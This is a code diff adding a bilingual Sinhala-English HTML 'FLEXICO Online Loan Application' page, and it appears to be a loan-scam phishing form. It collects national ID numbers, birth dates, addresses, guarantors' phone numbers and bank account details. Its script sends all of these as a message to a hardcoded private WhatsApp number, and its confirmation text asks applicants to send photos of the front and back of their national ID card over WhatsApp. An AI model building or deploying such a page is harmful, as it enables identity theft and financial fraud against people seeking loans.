@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLEXICO Online Loan Form</title>
+<style>
+  body {
+    font-family: "Poppins", sans-serif;
+    background-color: #fff;
+    color: #003366;
+    margin: 0;
+    padding: 0;
+  }
+  .container {
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  .logo {
+    text-align: center;
+    margin-bottom: 15px;
+  }
+  .logo img {
+    width: 160px;
+  }
+  h2 {
+    text-align: center;
+    color: #003366;
+  }
+  form label {
+    display: block;
+    margin-top: 12px;
+    font-weight: bold;
+  }
+  form input, form select, form textarea {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+  }
+  button {
+    width: 100%;
+    background-color: #003366;
+    color: white;
+    padding: 12px;
+    font-size: 16px;
+    border: none;
+    border-radius: 6px;
+    margin-top: 20px;
+  }
+  #messageBox {
+    display: none;
+    text-align: center;
+    padding: 20px;
+    background: #f2f9ff;
+    border-radius: 10px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <img src="https://i.ibb.co/sFqZ9Q2/flexico-logo.png" alt="Flexico Logo">
+  </div>
+  <h2>FLEXICO Online Loan Application<br><small>ඔබගේ ණය අයදුම්පත</small></h2>
+
+  <form id="loanForm">
+
+    <h3>1. පුද්ගලික තොරතුරු / Personal Details</h3>
+    <label>සම්පූර්ණ නම / Full Name</label>
+    <input type="text" id="fullname" required>
+
+    <label>ජාතික හැඳුනුම්පත් අංකය / NIC</label>
+    <input type="text" id="nic" required>
+
+    <label>ලබාගන්නා මුදල / Requested Loan Amount</label>
+    <input type="text" id="amount" required>
+
+    <label>උපන්දිනය / Date of Birth</label>
+    <input type="date" id="dob" required>
+
+    <label>ලිපිනය / Address</label>
+    <textarea id="address" rows="2" required></textarea>
+
+    <label>මාසික ආදායම / Monthly Income</label>
+    <select id="income" required>
+      <option value="">--Select--</option>
+      <option value="Below Rs. 50,000">Below Rs. 50,000</option>
+      <option value="Rs. 50,000 - Rs. 100,000">Rs. 50,000 - Rs. 100,000</option>
+      <option value="Rs. 100,000 - Rs. 200,000">Rs. 100,000 - Rs. 200,000</option>
+      <option value="Above Rs. 200,000">Above Rs. 200,000</option>
+    </select>
+
+    <label>ඔබ සිටින නගරය / City</label>
+    <input type="text" id="city" required>
+
+    <label>දිස්ත්‍රික්කය / District</label>
+    <select id="district" required>
+      <option value="">--Select District--</option>
+      <option>Colombo</option>
+      <option>Gampaha</option>
+      <option>Kalutara</option>
+      <option>Kandy</option>
+      <option>Matale</option>
+      <option>Nuwara Eliya</option>
+      <option>Galle</option>
+      <option>Matara</option>
+      <option>Hambantota</option>
+      <option>Jaffna</option>
+      <option>Kilinochchi</option>
+      <option>Mannar</option>
+      <option>Vavuniya</option>
+      <option>Mullaitivu</option>
+      <option>Batticaloa</option>
+      <option>Ampara</option>
+      <option>Trincomalee</option>
+      <option>Kurunegala</option>
+      <option>Puttalam</option>
+      <option>Anuradhapura</option>
+      <option>Polonnaruwa</option>
+      <option>Badulla</option>
+      <option>Monaragala</option>
+      <option>Ratnapura</option>
+      <option>Kegalle</option>
+    </select>
+
+    <h3>2. ඇපකරුවන්ගේ තොරතුරු / Guarantor Details</h3>
+    <label>ඇපකරුවා 1 නම / Guarantor 1 Name</label>
+    <input type="text" id="g1name" required>
+    <label>දුරකථන අංකය / Phone Number</label>
+    <input type="tel" id="g1phone" required>
+
+    <label>ඇපකරුවා 2 නම / Guarantor 2 Name</label>
+    <input type="text" id="g2name" required>
+    <label>දුරකථන අංකය / Phone Number</label>
+    <input type="tel" id="g2phone" required>
+
+    <h3>3. ගෙවීම් හැකියාව / Payment Ability</h3>
+    <label>ඔන්ලයින් ගෙවීමේ හැකියාව / Online Payment Ability</label>
+    <select id="onlinePay" required>
+      <option value="">--Select--</option>
+      <option value="Yes">Yes</option>
+      <option value="No">No</option>
+    </select>
+
+    <label>ණය ලබා ගැනීමේ හේතුව / Reason for Loan</label>
+    <select id="purpose" required>
+      <option value="">--Select--</option>
+      <option value="Business">Business</option>
+      <option value="Personal">Personal</option>
+      <option value="Education">Education</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <h3>4. ගිණුම් තොරතුරු / Bank Details</h3>
+    <label>ගිණුම් අංකය / Account Number</label>
+    <input type="text" id="accno" required>
+
+    <label>බැංකුවේ නම / Bank Name</label>
+    <select id="bank" required>
+      <option value="">--Select Bank--</option>
+      <option value="BOC">Bank of Ceylon</option>
+      <option value="People's Bank">People's Bank</option>
+      <option value="Sampath Bank">Sampath Bank</option>
+      <option value="Commercial Bank">Commercial Bank</option>
+      <option value="HNB">Hatton National Bank</option>
+      <option value="Seylan Bank">Seylan Bank</option>
+      <option value="DFCC Bank">DFCC Bank</option>
+      <option value="NDB Bank">NDB Bank</option>
+      <option value="Union Bank">Union Bank</option>
+      <option value="Other">Other</option>
+    </select>
+
+    <label>ශාඛාව / Branch</label>
+    <input type="text" id="branch" required>
+
+    <label>ගිණුම් හිමියාගේ සම්පූර්ණ නාමය / Account Holder Name</label>
+    <input type="text" id="accholder" required>
+
+    <button type="submit">Submit / යවන්න</button>
+  </form>
+
+  <div id="messageBox">
+    <p><b>ඔබගේ විස්තර සාර්ථකව ලැබී ඇත!</b><br>
+    ඔබගේ විස්තර පරීක්ෂා කිරීම සඳහා විනාඩි 30ක් ගතවනු ඇත.<br><br>
+    <b>කරුණාකර ඔබගේ ජාතික හැඳුනුම්පත ඉදිරිපස සහ පිටුපස පැහැදිලි ඡායාරූප දෙකක් WhatsApp හරහා එවන්න.</b></p>
+  </div>
+</div>
+
+<script>
+(function(){
+  const form = document.getElementById('loanForm');
+  const msgBox = document.getElementById('messageBox');
+  const whatsappNumber = "94724400033";
+  const idCode = "1114534700012";
+
+  function encode(t){ return encodeURIComponent(t); }
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    const required = Array.from(form.querySelectorAll('[required]'));
+    for (const r of required){ if (!r.value.trim()){ r.focus(); return; } }
+
+    const data = {
+      name: fullname.value.trim(),
+      nic: nic.value.trim(),
+      amount: amount.value.trim(),
+      dob: dob.value,
+      address: address.value.trim(),
+      income: income.value,
+      city: city.value.trim(),
+      district: district.value,
+      g1name: g1name.value.trim(),
+      g1phone: g1phone.value.trim(),
+      g2name: g2name.value.trim(),
+      g2phone: g2phone.value.trim(),
+      onlinePay: onlinePay.value,
+      purpose: purpose.value,
+      accno: accno.value.trim(),
+      bank: bank.value,
+      branch: branch.value.trim(),
+      accholder: accholder.value.trim()
+    };
+
+    form.style.display = 'none';
+    msgBox.style.display = 'block';
+
+    const lines = [
+      "New Flexico Application",
+      "--------------------------------",
+      "👤 Name: " + data.name,
+      "🆔 NIC: " + data.nic,
+      "💰 Amount: Rs. " + data.amount,
+      "🎂 DOB: " + (data.dob || '-'),
+      "🏠 Address: " + data.address,
+      "💼 Income: " + data.income,
+      "🏙 City: " + data.city + " | " + data.district,
+      " ",
+      "🔒 Guarantor 1: " + data.g1name + " (" + data.g1phone + ")",
+      "🔒 Guarantor 2: " + data.g2name + " (" + data.g2phone + ")",
+      " ",
+      "💳 Bank: " + data.bank + " | Acc: " + data.accno + " | Branch: " + data.branch,
+      "Account Holder: " + data.accholder,
+      " ",
+      "Online Pay: " + data.onlinePay + " | Purpose: " + data.purpose,
+      " ",
+      "Application ID: " + idCode,
+      "--------------------------------",
+      "Form submitted via Flexico web form."
+    ];
+
+    const msg = lines.join('\n');
+    const waUrl = "https://wa.me/" + whatsappNumber + "?text=" + encode(msg);
+
+    // Create "Open WhatsApp" button
+    const btn = document.createElement('button');
+    btn.textContent = "Open WhatsApp / WhatsApp එක විවෘත කරන්න";
+    btn.style.background = "#25D366";
+    btn.style.color = "#fff";
+    btn.style.fontWeight = "700";
+    btn.style.padding = "12px";
+    btn.style.marginTop = "12px";
+    btn.style.borderRadius = "8px";
+    btn.onclick = () => window.open(waUrl, '_blank');
+    msgBox.appendChild(btn);
+  });
+})();
+</script>
+</body>
+</html>
